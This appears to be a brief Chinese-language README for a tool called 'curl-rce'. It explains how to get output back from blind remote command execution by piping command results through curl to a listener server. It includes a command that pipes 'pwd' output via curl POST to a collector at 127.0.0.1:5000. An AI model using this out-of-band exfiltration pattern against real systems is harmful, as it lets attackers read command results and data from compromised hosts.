# curl-rce
在无回显的情况下，通过curl外带命令，达到回显的效果
1.服务端部署
2.运行python3 app.py
3.客户端请求pwd | curl -X POST -d @- http://127.0.0.1:5000/
4.访问http://127.0.0.1/来查看客户端命令执行结果
<img width="1511" alt="图片" src="https://github.com/shanxigetanxiaochou/curl-rce/assets/64448262/243cc31e-58d4-4fc3-b9ef-9a7aca62feeb">
